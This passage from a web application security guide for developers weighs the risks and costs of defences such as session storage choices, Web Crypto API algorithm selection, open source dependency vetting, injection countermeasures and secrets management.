The flows, what they are, how they work, and in which situations you should use any one of them, can easily be misunderstood.

When navigating the edge cases and deciding on specific paths, the developer can often end up at a dead end and must backtrack/re-architect their approach.

There is the risk that you may misinterpret any of the specifications, such as OAuth and OpenID, as these are complicated and fraught with concepts that can be easily misunderstood.

With regard to securing sessions, you have some options. If you are constrained by business requirements that demand you use cookies, then your attack vectors are more dispersed (XSS and CSRF). If you are not constrained to use cookies, and decide to use LocalStorage for all storage of client-side session artifacts, then you can reduce your scope of focus to just XSS, but your XSS defence strategy is going to need to be watertight.

### Cryptography on the Client (AKA Untrusted Crypto) {#web-applications-risks-that-solution-causes-cryptography-on-the-client}

The Web Cryptography API specification provides [algorithm recommendations](https://dvcs.w3.org/hg/webcrypto-api/raw-file/tip/spec/Overview.html#algorithm-recommendations-implementers) that are not necessarily optimal, such as the most commonly used 30 year old AES-**CBC** mode of operation that has known vulnerabilities, and caveats that you must know about in order to use securely, such as:

* The message must be padded to a multiple of the cipher block size
* Encryption is sequential, it cannot be parallelized, because each block of plaintext must be XORed with the previous block of ciphertext before being encrypted. Because of this, each block of ciphertext depends on all previously processed blocks of plaintext up to that point
* An initialisation vector (IV) must be used in the first block in order to create each message as unique
* Requiring that the final block be padded before encryption
* "_Decrypting with the incorrect IV causes the first block of plaintext to be corrupt but subsequent plaintext blocks will be correct_"
* "_a one-bit change to the ciphertext causes complete corruption of the corresponding block of plaintext, and inverts the corresponding bit in the following block of plaintext, but the rest of the blocks remain intact. This peculiarity is exploited in different padding oracle attacks, such as POODLE._"

> Some of the above content was used from [https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation)  
> Licensed under [CC by 3.0](https://en.wikipedia.org/wiki/Wikipedia:Text_of_Creative_Commons_Attribution-ShareAlike_3.0_Unported_License)

There is no normative guidance in the specification as to which primitives have better qualities than others. For example, the symmetric block cipher AES-GCM is good, but all of the other symmetric block ciphers listed are not [authenticated encryption modes](https://en.wikipedia.org/wiki/Authenticated_encryption). They don't provide assurance that the data has not been modified. With a specification that is lacking normative advice to browser vendors, it is likely that the Web Crypto API will fail to serve the purpose that it was created for, or at best, provide the right primitives, but also provide the dangerous ones too. Looking at where Chrome and Firefox are heading, that looks to be the case.

The following table shows the Web Crypto API supported algorithms for Chromium (as of version 46) and Mozilla (as of July 2016).

![](images/WebCryptoAPIBrowserSupport.png)

Both are offering AES-GCM, but now you have to make the decision, and too much choice can bring confusion. The only way for web developers to know which choices to make is to spend the time researching what to use where, and ask yourself the questions "why?" Question everything.

As usual, the [OWASP guidance](https://www.owasp.org/index.php/Cryptographic_Storage_Cheat_Sheet#Rule_-_Use_strong_approved_Authenticated_Encryption) (Cryptographic Storage Cheat Sheet) is excellent.

There are many stack-overflow questions and answers where many people think they have the answers but really don't. Even accepted answers are completely incorrect and misleading. Learn who the experts are, find out what they have to say and test their answers against what other experts have to say for yourself. All the information is available, though you do have to take the time to absorb it though. There are few shortcuts that will put you in a good place to work out the optimal solution for your project.

### Consuming Free and Open Source

Adding process and tooling as discussed is a really good start. However, it's not a complete solution to protect the consumption of free and open source packages.  
Some of these packages we consume may have good test coverage, be up-to-date, and have no known vulnerabilities. Are their tests testing the right things though? Are the tests testing that something bad can "not" happen, as we discussed in the creation of "Evil Test Conditions" in the "Agile Development and Practices" section of the "Process and Practises" chapter in [Fascicle 0](https://f0.holisticinfosecforwebdevelopers.com)? This is where we really need something extra on top of having good process, static analysis, and dependency checking tools. This is really where you need to leverage the likes of security regression testing, as I discussed in the "Agile Development and Practices" section of the "Process and Practises" chapter in [Fascicle 0](https://f0.holisticinfosecforwebdevelopers.com).

#### Process

There is a danger of implementing too many manual processes, which slows down development more than necessary. The way the process is implemented will have a lot to do with its level of success. For example, automating as much as possible, so developers don't have to think about too much, is going to make them more productive, focussed, and [happier](https://en.wikipedia.org/wiki/Kaizen).

For example, a Development Team needs to pull a library into their project, which often happens in the middle of working on a product backlog item, and is not necessarily planned at the beginning of the Sprint. When programmers have to context switch while a legal review and/or manual code review takes place, this can cause friction and reduce the team's performance even though it may be out of their hands.  
In this case, the Development Team really needs a dedicated resource to perform the legal review. These sorts of decisions need to be made by the Development Team, not mandated by someone outside of the team that doesn't have skin in the game or does not have the localised understanding that the people working on the project do.

Maintaining a list of the approved libraries really needs to be a process that does not take a lot of human interaction. How ever you work out your process, make sure it does not require a lot of extra developer effort on an ongoing basis. Some effort up front to automate as much as possible will facilitate this.

#### Tooling

Relying on tooling alone is not enough.

Using the likes of pre-commit hooks with the CLIs, and the other tooling options detailed in the [Countermeasures](#web-applications-countermeasures-consuming-free-and-open-source-tooling) section integrated with CI builds, as well as creating scripts to do most of the work for us, is going to be a good option to start with. Adding the automation of security regression testing on top of that, and your solution for managing potential vulnerabilities in free and open source packages starts to look pretty solid.

### Insufficient Attack Protection

Applying WAFs can act as a bandaid, masking the underlying issues with the application code. Ideally, your security issues should fail fast in development. If you are running the types of tests and doing the types of activities I discussed in Fascicle 0 in the Process and Practises chapter, you should have a fairly good handle on your defects. Most WAFs I have seen are pretty oldschool, in that they do not actively attack the attackers.

Moving toward an active automated prevention standpoint, where you have code that intentionally attracts and responds to attackers, is usually far more effective at dealing with malicious actors.

## 5. SSM Costs and Trade-offs {#web-applications-costs-and-trade-offs}

All security has a cost. Your resources are limited, spend them wisely.

### Lack of Visibility

#### Insufficient Logging and Monitoring

You can do a lot for little cost here. I would rather trade off a few days work in order to have really good logging and instrumentation systems throughout the code base. This should show errors fast in development and pretty much anything you want to measure. Then show the types of errors and statistics devops need to see in production.

Same goes for dark cockpit type monitoring. Find a tool that you find working with a pleasure. There are just about always free and open source tools to every commercial alternative. If you are working with a startup or young business, the free and open source tools can be excellent to keep ongoing costs down. There are also especially mature tools that are also well maintained like the ones I've mentioned in the [Countermeasures](#web-applications-countermeasures-lack-of-visibility) section.

### Lack of Input Validation, Filtering and Sanitisation

If you can tighten up your validation and filtering, then less work will be required around sanitisation, and that is where most of the effort (effort ≈ time) seems to go. This often reduces the end user experience though.

Once you fully understand the dangers you'll be able to make these decisions easier.

#### Cross-Site Scripting (XSS)

Covered above.

### Cross-Site Request Forgery (CSRF)

As mentioned in the "Risks that Solution Causes", I generally favour storing session identifiers in localstorage and concentrating on Input Validation, Filtering, and Sanitisation.

### Injection

You have a responsibility to your organisation and your customers to keep them safe. When you have weighed the costs of reviewing your code and, if it is honestly more expensive than the cost to you and your customers being exploited, i.e. losing your assets, then and only then should you neglect this.

Writing interpreters will more than likely be very costly, and in most cases this will not be necessary. Find one that takes the risks we discussed seriously and provides the correct countermeasures as discussed, or make sure you take care of the validation, filtering, and sanitisation properly yourself.

If you can not find a parametrised API for your use case, you will need to consider doing this yourself. Wrap whatever is the best available, and provide your own parametrisation.

Creating semantic types forces you and your stake holders to think about your business requirements, anything that makes us think about these are usually helpful in making sure we are building the right thing. There are not really any alternatives to actually thinking through the semantic types, validation, filtering, and sanitisation. Make sure you are doing it properly, this is crucial to catching malicious sequences of untrusted data. The only other alternative is to just not process untrusted data.

Make sure your accounts, and everything that can execute untrusted data, have only the privileges assigned to them to do what they must do, and no more.

If you do try and cut costs here, then you are providing the information your attacker needs to understand how your systems internals are structured. If you reveal the system's weaknesses, they will be exploited.

#### SQLi

The only possible shortcut here is to not deal with untrusted data.

#### NoSQLi {#web-applications-costs-and-trade-offs-nosqli}

Similar to SQLi

#### Command Injection

Exactly how much will it cost you depends on how poorly the code is written, and how much has to be refactored.

#### XML Injection

If you have had a look at how easily some of these defects are exploitable, then you should realise that the costs to remedy are small in comparison to losing your assets.

#### XSLT Injection

Similar costs to that of Command Injection, just different technology.

#### XPath Injection

Similar costs to that of what we have already covered, just different technology.

#### XQuery Injection

Similar costs to that of what we have already covered, just different technology.

#### LDAP Injection

Similar costs to that of what we have already covered, just different technology.

### Captcha

The proposed solution costs very little time to implement, is simple, has no external dependencies, and is not circumvented if JavaScript is disabled. In fact, it is not dependant on the browser or what is in the browser at all.

Any spam submitted by a real human will have to be moderated by a real human, although this usually takes less time than the human submitting the spam. For me, this is a trade-off worth taking to provide an optimal user experience for my customers/clients.

### Management of Application Secrets

There is potential for hidden costs here, as adjacent layers will need to be hardened. There could be tradeoffs here that force us to focus on the adjacent layers. This is never a bad thing though. It helps us to step back and take a holistic view of our security.

#### Store Configuration in Configuration files

There should be little cost in moving secrets out of source code and into configuration files.

##### Windows:

You will need to weigh whether the effort to obfuscate secrets is worth it or not. It can also make the developers job more cumbersome. Some of the options provided may be worthwhile doing.

##### Linux

Containers have many other advantages. You may already be using them for making your deployment processes easier and are less likely to have dependency issues. They also help with scaling and load balancing, so they have multiple benefits.

#### Least Privilege

You should at least consider and probably do in every case. It is one of those considerations that is worth while applying to most layers.

#### Location

Segmenting of resources is a common and effective measure to take to slow down attacks and a cost well worth considering if you have not already.

#### Datastore Compromise

The countermeasures discussed here go without saying, although many organisations do not do them well, if at all. It is up to you whether you want to be one of the statistics that has all of their secrets revealed. Following the countermeasures here is something that just needs to be done if you have any data that is sensitive in your datastore(s). 

### Lack of Authentication, Authorisation and Session Management

The cost of performing enough research and creating Proof of Concepts (PoC) is significant, even more so when your project is micro-service based, as you will have multiple technology environments that cross cutting concerns such as authentication, authorisation and session management affect (server side, client side, mobile, IoT, etc). I've found that if your project has the luxury of being green field, then reducing the technologies used to the lowest common denominator can reduce a lot of effort. If you can use the same technologies in all environments, or as many as possible, this will reduce the amount of Research and Development (R&D) that the team will need to do in order to prove a working solution. The lowest common denominator in terms of technology stacks that work in all environments is JavaScript. In case you hadn't noticed, JavaScript is creeping into all environments for this very reason. Embrace it, and you will likely save a lot of money.

I've heard this said many times "but we just can't find enough people with solid JavaScript skills and experience". It doesn't matter what the specific speciality is, I've personally struggled with this type of comment. If you think back to the Countermeasures section of the People chapter of Fascicle 0, specifically "Morale, Productivity and Engagement Killers" and onward, there is quite a bit of information around how to treat people with the respect they deserve. Exceptionally talented technical workers have paid a high price to become who and what they are. If you learn to respect them, and build strong meaningful relationships with these highly talented people, when you need the talent, it'll be easy to find, they will be your friends. This has been my experience, anyway. You can find these individuals always attending (if not leading) after work tech meetups, tech conferences, and other events. They will also often be the last to leave the office each day, as they struggle to tear themselves away from their work due to a high level of engagement. They are always pushing their own technical limits and increasing their knowledge and experience. They are not hard to find if you follow this advice.

If you still struggle, reach out to me, and I'll do my best to help.

### Cryptography on the Client (AKA Untrusted Crypto) {#web-applications-costs-and-trade-offs-cryptography-on-the-client}

I have covered many technologies in this chapter and also in others, as in the Network chapter under Countermeasures:

* "Wrongfully Trusting the Loading of Untrusted Web Resources"  
  For example, do everything we can to validate that what we're downloading is, in fact, what we think it is:
  * Content Security Policy (CSP)
  * Sub-resource Integrity (SRI) allows us to cryptographically guarantee that the resources we are downloading have not been tampered with. There is no point in consuming what we think is the crypto library we designated if what we are actually consuming is an attackers side-channel attack
* "TLS Downgrade"

That, if adopted and practised properly, along with selecting the right low level primitives for the Web Crypto API, can help us achieve a level of security that will work for us (the web application developers/owners). Of course, this puts our best interests at the forefront, but not necessarily the endusers. As developers creating solutions for our users, we have a responsibility to put our user's concerns first. 

### Consuming Free and Open Source

The process has to be streamlined so that it does not get in the developer's way. A good way to do this is to ask the developers how it should be done. They know what will get in their way. In order for the process to be a success, the person(s) mandating it will need to get solid buyin from the people using it (the developers).

The idea of setting up a process that notifies the Development Team if a library they want to use has known security defects needs to be pitched to all stakeholders (developers, product owner, even external stakeholders) the right way. It needs to provide obvious benefit, and not make anyone's life harder than it already is. Everyone has their own agendas. Rather than fighting against them, include consideration for them in your pitch. I think this sort of a pitch is actually reasonably easy if you keep these factors in mind.

### Insufficient Attack Protection

It will cost you some time to create these type of active defence modules. If you are lucky, by the time you read this, I may already have some. It is on my current todo list.



